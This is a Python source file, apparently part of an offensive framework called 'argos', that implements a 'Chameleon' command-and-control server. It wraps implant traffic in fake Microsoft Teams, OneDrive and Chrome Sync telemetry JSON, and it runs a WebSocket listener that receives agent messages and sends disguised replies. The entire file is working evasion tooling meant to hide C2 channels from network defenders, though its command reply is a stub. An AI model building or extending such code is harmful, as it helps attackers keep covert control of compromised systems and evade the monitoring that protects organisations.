"""
evasion/chameleon_c2.py
───────────────────────
Chameleon C2 — Servidor C2 Python con camuflaje de tráfico.
Envuelve Protobuf en JSON de telemetría de apps legítimas (Teams, OneDrive, Chrome).
"""

from __future__ import annotations

import asyncio
import base64
import json
import logging
import random
import string
import time
from pathlib import Path
from typing import Any, Dict, Optional

log = logging.getLogger("argos.chameleon_c2")

TRAFFIC_TEMPLATES_DIR = Path(__file__).parent / "traffic_templates"


class ChameleonC2:
    """
    Servidor C2 con camuflaje de tráfico.

    Principio:
    1. El payload Protobuf se codifica en base64.
    2. Se envuelve en un JSON que imita telemetría de una app legítima.
    3. Se transmite por WebSocket sobre TLS.

    El agente Go hace lo mismo en el lado cliente (chameleon.go).
    """

    DECOY_APPS = ["teams", "onedrive", "chrome_sync"]

    def __init__(self) -> None:
        self._templates: Dict[str, dict] = {}
        self._load_templates()

    def _load_templates(self) -> None:
        """Carga las plantillas JSON de apps señuelo."""
        for app in self.DECOY_APPS:
            tpl_file = TRAFFIC_TEMPLATES_DIR / f"{app}.json"
            if tpl_file.exists():
                with open(tpl_file, encoding="utf-8") as f:
                    self._templates[app] = json.load(f)
                log.debug(f"[Chameleon] Plantilla cargada: {app}")
            else:
                self._templates[app] = {}

    def wrap(self, protobuf_data: bytes, decoy_app: Optional[str] = None) -> str:
        """
        Envuelve datos Protobuf en JSON de la app señuelo.
        Retorna string JSON listo para transmitir.
        """
        if decoy_app is None:
            decoy_app = random.choice(self.DECOY_APPS)

        b64_payload = base64.b64encode(protobuf_data).decode("ascii")
        wrapper = self._build_wrapper(decoy_app, b64_payload)
        return json.dumps(wrapper, separators=(",", ":"))

    def unwrap(self, json_str: str) -> Optional[bytes]:
        """
        Extrae el payload Protobuf del JSON señuelo.
        Retorna bytes o None si el formato no es válido.
        """
        try:
            data = json.loads(json_str)
            # El payload puede estar en diferentes campos según la app
            b64 = (
                data.get("pl") or          # Teams
                data.get("data") or        # OneDrive
                data.get("payload") or     # Chrome Sync top-level
                data.get("d")
            )
            # Chrome Sync nests payload inside updates[0]["payload"]
            if not b64 and "updates" in data:
                updates = data.get("updates", [])
                if updates and isinstance(updates, list) and len(updates) > 0:
                    b64 = updates[0].get("payload")
            if b64:
                return base64.b64decode(b64)
        except Exception as exc:
            log.warning(f"[Chameleon] Error al desenvolver: {exc}")
        return None

    def _build_wrapper(self, app: str, b64_payload: str) -> dict:
        ts = int(time.time())

        if app == "teams":
            return {
                "evt": "userpresence",
                "ts":  ts,
                "u":   f"user{random.randint(100,999)}@company.com",
                "s":   random.choice(["available", "busy", "away"]),
                "pl":  b64_payload,
                "sq":  random.randint(1000, 99999),
                "cv":  f"27/1.0.0.{random.randint(100,999)}",
            }

        elif app == "onedrive":
            return {
                "type":   "sync_chunk",
                "fid":    "file_" + self._random_str(8),
                "rev":    random.randint(1, 100),
                "data":   b64_payload,
                "seq":    random.randint(1, 9999),
                "ts":     ts,
                "client": f"OneDrive/{random.randint(20,24)}.0",
            }

        elif app == "chrome_sync":
            return {
                "store":   "HISTORY",
                "marker":  self._random_str(16),
                "updates": [{"hash": self._random_str(8), "payload": b64_payload}],
                "ts":      ts,
                "ver":     f"chrome/{random.randint(120,125)}.0",
            }

        # Fallback genérico
        return {"data": b64_payload, "ts": ts}

    @staticmethod
    def _random_str(n: int) -> str:
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


# ─────────────────────────── WEBSOCKET SERVER ─────────────────────

class ChameleonServer:
    """
    Servidor WebSocket que recibe tráfico camuflado de los agentes.
    Se integra con el Director para procesar los eventos.
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 8443) -> None:
        self.host    = host
        self.port    = port
        self.chameleon = ChameleonC2()
        self._clients: Dict[str, Any] = {}

    async def start(self) -> None:
        try:
            import websockets
            log.info(f"[Chameleon] Servidor WS arrancado en {self.host}:{self.port}")
            async with websockets.serve(self._handler, self.host, self.port):
                await asyncio.Future()  # Correr para siempre
        except ImportError:
            log.error("[Chameleon] 'websockets' no instalado")

    async def _handler(self, websocket, path: str = "") -> None:
        agent_id = None
        try:
            async for message in websocket:
                raw_bytes = self.chameleon.unwrap(message)
                if raw_bytes:
                    log.debug(f"[Chameleon] Mensaje recibido ({len(raw_bytes)} bytes)")

                    # Intentar extraer agent_id del payload
                    try:
                        payload_str = message
                        if isinstance(payload_str, str):
                            import json as _json
                            wrapper = _json.loads(payload_str)
                            agent_id = wrapper.get("agent_id", wrapper.get("u"))
                            self._clients[agent_id] = websocket
                            log.info(f"[Chameleon] Agente {agent_id or 'anon'} conectado")
                    except Exception:
                        pass

                    # Procesar y responder
                    response = self._build_response(raw_bytes)
                    if response:
                        wrapped = self.chameleon.wrap(response, decoy_app="teams")
                        await websocket.send(wrapped)
        except Exception as exc:
            log.debug(f"[Chameleon] Conexión cerrada: {exc}")
        finally:
            if agent_id and agent_id in self._clients:
                del self._clients[agent_id]

    def _build_response(self, payload: bytes) -> bytes:
        """Construye una respuesta simulada al agente."""
        response_data = {
            "type": "ack",
            "status": "ok",
            "command": "CONTINUE",
        }
        return json.dumps(response_data).encode("utf-8")
